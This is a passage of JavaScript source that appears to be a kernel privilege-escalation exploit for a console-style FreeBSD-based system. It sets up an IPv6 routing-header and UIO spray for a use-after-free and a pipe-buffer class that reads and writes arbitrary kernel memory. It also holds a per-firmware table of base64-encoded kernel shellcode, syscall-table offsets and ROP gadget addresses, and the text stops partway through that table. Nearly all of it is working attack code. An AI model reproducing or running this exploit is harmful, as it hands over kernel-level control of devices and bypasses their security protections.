"use strict";

include("userland.js");
include("threading.js");
include("ntctrl_utils.js");
include("loader.js");

//#region Variables
var UIO_THREAD_NUM = 1;
var IPV6_SOCK_NUM = 0x40;
var FIND_TWINS_NUM = 0x80;
var FIND_TRIPLET_NUM = 0x80;
var SPRAY_IOV_NUM = 0x100;
var SPRAY_UIO_NUM = 0x100;
var LEAK_KQUEUE_NUM = 0x200;
//#endregion
//#region Contants
var KERNEL_PID = 0;

var PAGE_SIZE = 0x4000;

var SYSCORE_AUTHID = new BigInt("0x4800000000000007");

var FIOSETOWN = 0x8004667C;

var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
var NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;

var F_SETFL = 4;

var O_NONBLOCK = 4;

var SOCK_STREAM = 1;

var IPPROTO_IPV6 = 41;

var AF_UNIX = 1;
var AF_INET6 = 28;

var SO_SNDBUF = 0x1001;
var SOL_SOCKET = 0xFFFF;

var IPV6_RTHDR = 51;

var UIO_READ = 0;
var UIO_WRITE = 1;
var UIO_SYSSPACE = 1;

var UIO_IOV_NUM = 0x14;
var MSG_IOV_NUM = 0x17;

var UCRED_SIZE = 0x168;
var KQUEUE_SIZE = 0x100;
var FILEDESCENT_SIZE = 8;

var rthdr_tag = [0x00, 0x37, 0x13];
var uio_ss = new Array(2);
var twins = new Array(2);
var triplets = new Array(3);
var master_pipe = new Array(2);
var slave_pipe = new Array(2);
var ipv6_socks = new Array(IPV6_SOCK_NUM);
var uio_threads = new Array(UIO_THREAD_NUM);

var spray_rthdr0_len = undefined;
var leak_rthdr0_len_addr = undefined;

var spray_rthdr0 = undefined;
var leak_rthdr0 = undefined;

var msg = undefined;
var msg_iov = undefined;
var msg_uio = undefined;
var uio_iov_read = undefined;
var uio_iov_write = undefined;

var uio_worker = undefined;

var uaf_sock = undefined;

var kernel_base = undefined;
var kl_lock = undefined;
var kq_fdp = undefined;
var fdt_ofiles = undefined;
var allproc =  undefined;

var kv = undefined;
var tmp = undefined;

var getpid = new NativeFunction(0x14, "bigint");
var setuid = new NativeFunction(0x17, "bigint");
var sendmsg = new NativeFunction(0x1C, "bigint");
var dup = new NativeFunction(0x29, "bigint");
var pipe = new NativeFunction(0x2A, "bigint");
var ioctl = new NativeFunction(0x36, "bigint");
var fcntl = new NativeFunction(0x5C, "bigint");
var socket = new NativeFunction(0x61, "bigint");
var netcontrol = new NativeFunction(0x63, "bigint");
var setsockopt = new NativeFunction(0x69, "bigint");
var getsockopt = new NativeFunction(0x76, "bigint");
var socketpair = new NativeFunction(0x87, "bigint");
var sched_yield = new NativeFunction(0x14B, "bigint");
var kqueue = new NativeFunction(0x16A, "bigint");
//#endregion
//#region Classes
class KernelView {
    constructor(master_pipe, slave_pipe) {
        this.view = new DataView(new ArrayBuffer(8));

        if (!Array.isArray(master_pipe) || master_pipe.length !== 2) {
            throw new Error("pipe should have 2 fds for r/w");
        }

        if (!Array.isArray(slave_pipe) || slave_pipe.length !== 2) {
            throw new Error("pipe should have 2 fds for r/w");
        }

        this.master_pipe = master_pipe;
        this.slave_pipe = slave_pipe;

        if (fcntl.invoke(this.master_pipe[0], F_SETFL, O_NONBLOCK).eq(-1)) {
            throw new SyscallError(`Unable to fcntl fd ${this.master_pipe[0]}`);
        }

        if (fcntl.invoke(this.master_pipe[1], F_SETFL, O_NONBLOCK).eq(-1)) {
            throw new SyscallError(`Unable to fcntl fd ${this.master_pipe[1]}`);
        }

        if (fcntl.invoke(this.slave_pipe[0], F_SETFL, O_NONBLOCK).eq(-1)) {
            throw new SyscallError(`Unable to fcntl fd ${this.slave_pipe[0]}`);
        }

        if (fcntl.invoke(this.slave_pipe[1], F_SETFL, O_NONBLOCK).eq(-1)) {
            throw new SyscallError(`Unable to fcntl fd ${this.slave_pipe[1]}`);
        }
        
        var pipe_buf_addr = alloc(pipebuf.sizeof);
        this.pipe_buf = pipebuf.from(pipe_buf_addr);

        this.pipe_buf.in = 0;
        this.pipe_buf.out = 0;
        this.pipe_buf.size = PAGE_SIZE;
    }

    get_backing() {
        return this.pipe_buf.buffer;
    }

    set_backing(addr) {
        if (!(addr instanceof BigInt)) {
            throw new Error(`${addr} is not a BigInt !!`);
        }

        if (addr.eq(0)) {
            throw new Error("Empty addr !!");
        }

        this.pipe_buf.buffer = addr;
    }

    set_length(length) {
        if (length < 0 && length > 0xFFFFFFFF) {
            throw new RangeError(`size ${length} out of range !!`);
        }

        this.pipe_buf.cnt = length;
    }

    flush() {
        if (write.invoke(this.master_pipe[1], this.pipe_buf.addr, pipebuf.sizeof).eq(-1)) {
            throw new SyscallError(`Unable to write to fd ${this.master_pipe[1]} !!`);
        }

        if (read.invoke(this.master_pipe[0], this.pipe_buf.addr, pipebuf.sizeof).eq(-1)) {
            throw new SyscallError(`Unable to read from fd ${this.master_pipe[0]} !!`);
        }
    }

    kread(dst, src, sz) {
        this.set_backing(src);
        this.set_length(sz);
        this.flush();

        var n = read.invoke(this.slave_pipe[0], dst, sz);
        if (n.eq(-1)) {
            throw new SyscallError(`Unable to read from fd ${this.slave_pipe[0]} !!`);
        }

        debug(`kread: ${n.valueOf()} byte(s) - ${this.view.getBigInt(0, true)} <= ${src}`);

        return n;
    }

    kwrite(dst, src, sz) {
        this.set_backing(dst);
        this.set_length(sz);
        this.flush();

        var n = write.invoke(this.slave_pipe[1], src, sz);
        if (n.eq(-1)) {
            throw new SyscallError(`Unable to write to fd ${this.slave_pipe[1]} !!`);
        }

        debug(`kwrite: ${n.valueOf()} byte(s) - ${this.view.getBigInt(0, true)} => ${dst}`);

        return n;
    }

    getFloat32(byteOffset, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 4);

        return this.view.getFloat32(0, littleEndian);
    }

    getFloat64(byteOffset, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 8);

        return this.view.getFloat64(0, littleEndian);
    }

    getInt8(byteOffset) {
        this.view.setBigInt(0, 0, true);
        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 1);

        return this.view.getInt8(0);
    }

    getInt16(byteOffset, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 2);

        return this.view.getInt16(0, littleEndian);
    }

    getInt32(byteOffset, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 4);

        return this.view.getInt32(0, littleEndian);
    }

    getUint8(byteOffset) {
        this.view.setBigInt(0, 0, true);
        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 1);

        return this.view.getUint8(0);
    }

    getUint16(byteOffset, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 2);

        return this.view.getUint16(0, littleEndian);
    }

    getUint32(byteOffset, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 4);

        return this.view.getUint32(0, littleEndian);
    }

    getBigInt(byteOffset, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 8);

        return this.view.getBigInt(0, littleEndian);
    }

    setFloat32(byteOffset, value, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.view.setFloat32(0, value, littleEndian);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 4);
    }

    setFloat64(byteOffset, value, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setFloat64(0, value, littleEndian);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 8);
    }

    setInt8(byteOffset, value) {
        this.view.setBigInt(0, 0, true);
        this.view.setInt8(0, value);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 1);
    }

    setInt16(byteOffset, value, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.view.setInt16(0, value, littleEndian);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 2);
    }

    setInt32(byteOffset, value, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.view.setInt32(0, value, littleEndian);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 4);
    }

    setUint8(byteOffset, value) {
        this.view.setBigInt(0, 0, true);
        this.view.setUint8(0, value);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 1);
    }

    setUint16(byteOffset, value, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.view.setUint16(0, value, littleEndian);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 2);
    }

    setUint32(byteOffset, value, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.view.setUint32(0, value, littleEndian);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 4);
    }

    setBigInt(byteOffset, value, littleEndian) {
      littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;
      value = value instanceof BigInt ? value : new BigInt(value);

      this.view.setBigInt(0, value, littleEndian);

      this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 8);
    }
};

class KernelMisc {
    static get_property(version, name) {
        for (var major = version.major; major >= 0; major--) {
            if (major in KernelMisc.Map) {
                for (var minor = major === version.major ? version.minor : 0xFF; minor >= 0; minor--) {
                    if (minor in KernelMisc.Map[major] && name in KernelMisc.Map[major][minor]) {
                        return KernelMisc.Map[major][minor][name];
                    }
                }
            }
        }

        throw new Error(`${version} has no property ${name} !!`);
    }

    static SHELLCODE(version) { return KernelMisc.get_property(version, "SHELLCODE"); }
    static SYSENT_661(version) { return KernelMisc.get_property(version, "SYSENT_661"); }
    static JMP_RSI_GADGET(version) { return KernelMisc.get_property(version, "JMP_RSI_GADGET"); }
    static KL_LOCK(version) { return KernelMisc.get_property(version, "KL_LOCK"); }
};
//#endregion
//#region Static
KernelMisc.Map = {
    5: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sEAABBuJDp//9IgcKgMgEAxoG9CgAA68aBbaMeAOvGgbGjHgDrxoEtpB4A68aBcaQeAOvGgQ2mHgDrxoE9qh4A68aB/aoeAOvHgZMEAAAAAAAAxoHFBAAA62aJgbwEAABmibG4BAAAxoF9SgUA62aJufg6GgBmRImBKn4jAMeBUCMrAEgxwMPGgRDVEwA3xoET1RMAN8eBIMgHAQIAAABIiZEoyAcBx4FMyAcBAQAAAA8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x1084200,
            JMP_RSI_GADGET: 0x13460,
        },
        3: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sEAABBuJDp//9IgcKgMgEAxoG9CgAA68aBfaQeAOvGgcGkHgDrxoE9pR4A68aBgaUeAOvGgR2nHgDrxoFNqx4A68aBDaweAOvHgZMEAAAAAAAAxoHFBAAA62aJgbwEAABmibG4BAAAxoF9SgUA62aJuQg8GgBmRImBOn8jAMeBICYrAEgxwMPGgSDWEwA3xoEj1hMAN8eBIMgHAQIAAABIiZEoyAcBx4FMyAcBAQAAAA8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x1084200,
            JMP_RSI_GADGET: 0x13460
        },
        80: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC4kOn//77rAAAAv+sAAABBuOsEAABBuZDp//9IgcLMrQAAxoHtCgAA68aBDVlAAOvGgVFZQADrxoHNWUAA68aBEVpAAOvGgb1bQADrxoFtYEAA68aBPWFAAOvHgZAEAAAAAAAAZomBxgQAAGaJsb0EAABmibm5BAAAxoHNBwEA62ZEiYGY7gIAZkSJiQo5BgDHgTABQABIMcDDxoHZJTwAN8aB3CU8ADfHgdBeEQECAAAASImR2F4RAceB/F4RAQEAAAAPIMBIDQAAAQAPIsAxwMM=",
            SYSENT_661: 0x111D8B0,
            JMP_RSI_GADGET: 0xAF8C
        },
        83: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC4kOn//77rAAAAv+sAAABBuOsEAABBuZDp//9IgcLMrQAAxoHtCgAA68aBDVhAAOvGgVFYQADrxoHNWEAA68aBEVlAAOvGgb1aQADrxoFtX0AA68aBPWBAAOvHgZAEAAAAAAAAZomBxgQAAGaJsb0EAABmibm5BAAAxoHNBwEA62ZEiYGY7gIAZkSJiQo5BgDHgTAAQABIMcDDxoHZJDwAN8aB3CQ8ADfHgdBeEQECAAAASImR2F4RAceB/F4RAQEAAAAPIMBIDQAAAQAPIsAxwMM="
        },
        85: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC4kOn//77rAAAAv+sAAABBuOsEAABBuZDp//9IgcLMrQAAxoHtCgAA68aBzVtAAOvGgRFcQADrxoGNXEAA68aB0VxAAOvGgX1eQADrxoEtY0AA68aB/WNAAOvHgZAEAAAAAAAAZomBxgQAAGaJsb0EAABmibm5BAAAxoHNBwEA62ZEiYGY7gIAZkSJiQo5BgDHgfADQABIMcDDxoGZKDwAN8aBnCg8ADfHgdCuEQECAAAASImR2K4RAceB/K4RAQEAAAAPIMBIDQAAAQAPIsAxwMM=",
            SYSENT_661: 0x11228B0,
        },
        86: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC4kOn//77rAAAAv+sAAABBuOsEAABBuZDp//9IgcIJ7wMAxoHdCgAA68aBTUYRAOvGgZFGEQDrxoENRxEA68aBUUcRAOvGgf1IEQDrxoGtTREA68aBfU4RAOvHgZAEAAAAAAAAZomBxgQAAGaJsb0EAABmibm5BAAAxoHtkAIA62ZEiYFYIjUAZkSJiVr2JwDHgRCoAQBIMcDDxoFtAiQAN8aBcAIkADfHgVC3EQECAAAASImRWLcRAceBfLcRAQEAAAAPIMBIDQAAAQAPIsAxwMM=",
            SYSENT_661: 0x1123130,
            JMP_RSI_GADGET: 0x3F0C9
        }
    }, 
    6: {
        0: {
            SHELLCODE: "", // TODO
        },
        32: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC4kOn//77rAAAAv+sAAABBuOsEAABBuZDp//9IgcKuvAIAxoHdCgAA68aBTUYRAOvGgZFGEQDrxoENRxEA68aBUUcRAOvGgf1IEQDrxoGtTREA68aBfU4RAOvHgZAEAAAAAAAAZomBxgQAAGaJsb0EAABmibm5BAAAxoHtkAIA62ZEiYF4IjUAZkSJiXr2JwDHgRCoAQBIMcDDxoFtAiQAN8aBcAIkADfHgVD3EQECAAAASImRWPcRAceBfPcRAQEAAAAPIMBIDQAAAQAPIsAxwMM=",
            SYSENT_661: 0x1127130,
            JMP_RSI_GADGET: 0X2BE6E
        },
        80: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv5Dp//9BuOsAAABmiYEOxWMAQbnrAAAAQbrrBAAAQbuQ6f//uJDp//9IgcJNoxUAxoHNCgAA68aBTRE8AOvGgZERPADrxoENEjwA68aBURI8AOvGgf0TPADrxoGtGDwA68aBfRk8AOtmibEPzmMAx4GQBAAAAAAAAGaJucYEAABmRImBvQQAAGZEiYm5BAAAxoEnuxAA62ZEiZEIGkUAZkSJmR6AHQBmiYGqhR0Ax4Egn0EASDHAw8aBerUKADfGgX21CgA3x4EQ0hEBAgAAAEiJkRjSEQHHgTzSEQEBAAAADyDASA0AAAEADyLAMcDD",
            SYSENT_661: 0x1124BF0,
            JMP_RSI_GADGET: 0x15A50D
        },
        112: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv5Dp//9BuOsAAABmiYHOyGMAQbnrAAAAQbrrBAAAQbuQ6f//uJDp//9IgcJdzwkAxoHNCgAA68aB/RQ8AOvGgUEVPADrxoG9FTwA68aBARY8AOvGga0XPADrxoFdHDwA68aBLR08AOtmibHP0WMAx4GQBAAAAAAAAGaJucYEAABmRImBvQQAAGZEiYm5BAAAxoHXvhAA62ZEiZG4HUUAZkSJmc6DHQBmiYFaiR0Ax4HQokEASDHAw8aBerUKADfGgX21CgA3x4EQ4hEBAgAAAEiJkRjiEQHHgTziEQEBAAAADyDASA0AAAEADyLAMcDD",
            SYSENT_661: 0x1125BF0,
            JMP_RSI_GADGET: 0x9D11D
        }
    },
    7: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv5Dp//9BuOsAAABmiYHOrGMAQbnrAAAAQbrrBAAAQbuQ6f//uJDp//9IgcLSrwYAxoHNCgAA68aBje8CAOvGgdHvAgDrxoFN8AIA68aBkfACAOvGgT3yAgDrxoHt9gIA68aBvfcCAOtmibHvtWMAx4GQBAAAAAAAAGaJucYEAABmRImBvQQAAGZEiYm5BAAAxoF3ewgA62ZEiZEITCYAZkSJmcFOCQBmiYF7VAkAx4EgLC8ASDHAw8aBNiMdADfGgTkjHQA3x4FwWBIBAgAAAEiJkXhYEgHHgZxYEgEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsHAADGgbEbSgDrZomB7htKAEi4QYO/oAQAAABIiYH3G0oAuEmL///Ggf8bSgCQxoEIHEoAh8aBFRxKALfGgS0cSgCHxoE6HEoAt8aBUhxKAL/GgV4cSgC/xoFqHEoAv8aBdhxKAL9miYGFHEoAxoGHHEoA/w8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x112D250,
            JMP_RSI_GADGET: 0x6B192
        },
        80: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv5Dp//9BuOsAAABmiYGUc2MAQbnrAAAAQbrrBAAAQbuQ6f//uJDp//9IgcKC9gEAxoHdCgAA68aBTfcoAOvGgZH3KADrxoEN+CgA68aBUfgoAOvGgf35KADrxoGt/igA68aBff8oAOtmibHPfGMAx4GQBAAAAAAAAGaJucYEAABmRImBvQQAAGZEiYm5BAAAxoEnozcA62ZEiZHIFDAAZkSJmQQeRQBmiYHEI0UAx4EwmgIASDHAw8aBfbENADfGgYCxDQA3x4FQJRIBAgAAAEiJkVglEgHHgXwlEgEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsDAAC6BQAAADH2Mf9miYH1IAsAQbgBAAAASLhBg76gBAAAAEG5AQAAAEiJgfogCwC4BAAAAEG6TIn//2aJgQwhCwC4BAAAAGaJgRkhCwC4BQAAAMeBAyILAOny/v/GgQciCwD/x4EIIQsASYuG0MaBDiELAADHgRUhCwBJi7awxoEbIQsAAMeBLSELAEmLhkBmiYExIQsAxoEzIQsAAMeBOiELAEmLtiBmiZE+IQsAxoFAIQsAAMeBUiELAEmNvsBmibFWIQsAxoFYIQsAAMeBXiELAEmNvuBmibliIQsAxoFkIQsAAMeBcSELAEmNvgBmRImBdSELAMaBdyELAADHgX0hCwBJjb4gZkSJiYEhCwDGgYMhCwAAZkSJkY4hCwDGgZAhCwD3DyDASA0AAAEADyLAMcDD",
            SYSENT_661: 0x1129F30,
            JMP_RSI_GADGET: 0x1F842
        }
    },
    8: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcLcYA4AZomBVNJiAMaBzQoAAOvGgQ3hJQDrxoFR4SUA68aBzeElAOvGgRHiJQDrxoG94yUA68aBbeglAOvGgT3pJQDrZomxP9tiAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoGW1jQA62ZEiYmLxj4AZkSJkYSNMQDGgT+VMQDrx4HAUQkASDHAw8aBOtAPADfGgT3QDwA3x4Hgxg8BAgAAAEiJkejGDwHHgQzHDwEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBg/EJAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgYvxCQC4BAAAAEG5SYv//2aJgZ3xCQC4BAAAAGaJgarxCQC4BQAAAGaJgcLxCQC4BQAAAGZEiZlB8QkAx4GZ8QkASYuH0MaBn/EJAADHgabxCQBJi7ewxoGs8QkAAMeBvvEJAEmLh0DGgcTxCQAAx4HL8QkASYu3IGaJgc/xCQDGgdHxCQAAx4Hj8QkASY2/wGaJkefxCQDGgenxCQAAx4Hv8QkASY2/4GaJsfPxCQDGgfXxCQAAx4EC8gkASY2/AGaJuQbyCQDGgQjyCQAAx4EO8gkASY2/IGZEiYES8gkAxoEU8gkAAGZEiYkf8gkAxoEh8gkA/w8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x11040C0,
            JMP_RSI_GADGET: 0xE629C
        },
        80: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcJNfwwAZomBdEZiAMaBzQoAAOvGgT1AOgDrxoGBQDoA68aB/UA6AOvGgUFBOgDrxoHtQjoA68aBnUc6AOvGgW1IOgDrZomxX09iAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoHW8yIA62ZEiYnb1hQAZkSJkXR0AQDGgS98AQDrx4FA0DoASDHAw8aB6iYIADfGge0mCAA3x4HQxw8BAgAAAEiJkdjHDwHHgfzHDwEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBYwIDAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgWsCAwC4BAAAAEG5SYv//2aJgX0CAwC4BAAAAGaJgYoCAwC4BQAAAGaJgaICAwC4BQAAAGZEiZkhAgMAx4F5AgMASYuH0MaBfwIDAADHgYYCAwBJi7ewxoGMAgMAAMeBngIDAEmLh0DGgaQCAwAAx4GrAgMASYu3IGaJga8CAwDGgbECAwAAx4HDAgMASY2/wGaJkccCAwDGgckCAwAAx4HPAgMASY2/4GaJsdMCAwDGgdUCAwAAx4HiAgMASY2/AGaJueYCAwDGgegCAwAAx4HuAgMASY2/IGZEiYHyAgMAxoH0AgMAAGZEiYn/AgMAxoEBAwMA/w8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x11041B0,
            JMP_RSI_GADGET: 0xC810D
        }
    },
    9: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcLtxQQAZomBdGhiAMaBzQoAAOvGgf0TJwDrxoFBFCcA68aBvRQnAOvGgQEVJwDrxoGtFicA68aBXRsnAOvGgS0cJwDrZomxX3FiAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoEGGgAA62ZEiYmLCwgAZkSJkcSuIwDGgX+2IwDrx4FAGyIASDHAw8aBKmMWADfGgS1jFgA3x4EgBRABAgAAAEiJkSgFEAHHgUwFEAEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBQ1pBAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgUtaQQC4BAAAAEG5SYv//2aJgV1aQQC4BAAAAGaJgWpaQQC4BQAAAGaJgYJaQQC4BQAAAGZEiZkBWkEAx4FZWkEASYuH0MaBX1pBAADHgWZaQQBJi7ewxoFsWkEAAMeBflpBAEmLh0DGgYRaQQAAx4GLWkEASYu3IGaJgY9aQQDGgZFaQQAAx4GjWkEASY2/wGaJkadaQQDGgalaQQAAx4GvWkEASY2/4GaJsbNaQQDGgbVaQQAAx4HCWkEASY2/AGaJucZaQQDGgchaQQAAx4HOWkEASY2/IGZEiYHSWkEAxoHUWkEAAGZEiYnfWkEAxoHhWkEA/w8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x1107F00,
            JMP_RSI_GADGET: 0x4C7AD,
            KL_LOCK: 0x3977F0
        },
        3: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcKbMAUAZomBNEhiAMaBzQoAAOvGgX0QJwDrxoHBECcA68aBPREnAOvGgYERJwDrxoEtEycA68aB3RcnAOvGga0YJwDrZomxH1FiAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoEGGgAA62ZEiYmLCwgAZkSJkZSrIwDGgU+zIwDrx4EQGCIASDHAw8aB2mIWADfGgd1iFgA3x4EgxQ8BAgAAAEiJkSjFDwHHgUzFDwEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBszlBAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgbs5QQC4BAAAAEG5SYv//2aJgc05QQC4BAAAAGaJgdo5QQC4BQAAAGaJgfI5QQC4BQAAAGZEiZlxOUEAx4HJOUEASYuH0MaBzzlBAADHgdY5QQBJi7ewxoHcOUEAAMeB7jlBAEmLh0DGgfQ5QQAAx4H7OUEASYu3IGaJgf85QQDGgQE6QQAAx4ETOkEASY2/wGaJkRc6QQDGgRk6QQAAx4EfOkEASY2/4GaJsSM6QQDGgSU6QQAAx4EyOkEASY2/AGaJuTY6QQDGgTg6QQAAx4E+OkEASY2/IGZEiYFCOkEAxoFEOkEAAGZEiYlPOkEAxoFROkEA/w8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x1103F00,
            JMP_RSI_GADGET: 0x5325B,
            KL_LOCK: 0x3959F0,
        },
        80: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcKtWAEAZomB5EpiAMaBzQoAAOvGgQ0cIADrxoFRHCAA68aBzRwgAOvGgREdIADrxoG9HiAA68aBbSMgAOvGgT0kIADrZomxz1NiAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoE2pR8A62ZEiYk7bRkAZkSJkST3GQDGgd/+GQDrx4FgGQEASDHAw8aBei0SADfGgX0tEgA3x4EAlQ8BAgAAAEiJkQiVDwHHgSyVDwEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBs3cNAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgbt3DQC4BAAAAEG5SYv//2aJgc13DQC4BAAAAGaJgdp3DQC4BQAAAGaJgfJ3DQC4BQAAAGZEiZlxdw0Ax4HJdw0ASYuH0MaBz3cNAADHgdZ3DQBJi7ewxoHcdw0AAMeB7ncNAEmLh0DGgfR3DQAAx4H7dw0ASYu3IGaJgf93DQDGgQF4DQAAx4ETeA0ASY2/wGaJkRd4DQDGgRl4DQAAx4EfeA0ASY2/4GaJsSN4DQDGgSV4DQAAx4EyeA0ASY2/AGaJuTZ4DQDGgTh4DQAAx4E+eA0ASY2/IGZEiYFCeA0AxoFEeA0AAGZEiYlPeA0AxoFReA0A/w8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x1100EE0,
            JMP_RSI_GADGET: 0x15A6D,
            KL_LOCK: 0x85EE0
        }
    }, 
    10: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcLxZgAAZomBZOhhAMaBzQoAAOvGgW0sRwDrxoGxLEcA68aBLS1HAOvGgXEtRwDrxoEdL0cA68aBzTNHAOvGgZ00RwDrZomxT/FhAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoFWdyYA62ZEiYl7IDkAZkSJkaT6GADGgV8CGQDrx4FA6hsASDHAw8aBmtUOADfGgZ3VDgA3x4GgLxABAgAAAEiJkagvEAHHgcwvEAEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBgzYtAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgYs2LQC4BAAAAEG5SYv//2aJgZ02LQC4BAAAAGaJgao2LQC4BQAAAGaJgcI2LQC4BQAAAGZEiZlBNi0Ax4GZNi0ASYuH0MaBnzYtAADHgaY2LQBJi7ewxoGsNi0AAMeBvjYtAEmLh0DGgcQ2LQAAx4HLNi0ASYu3IGaJgc82LQDGgdE2LQAAx4HjNi0ASY2/wGaJkec2LQDGgek2LQAAx4HvNi0ASY2/4GaJsfM2LQDGgfU2LQAAx4ECNy0ASY2/AGaJuQY3LQDGgQg3LQAAx4EONy0ASY2/IGZEiYESNy0AxoEUNy0AAGZEiYkfNy0AxoEhNy0A/w8gwEgNAAABAA8iwDHAww==",
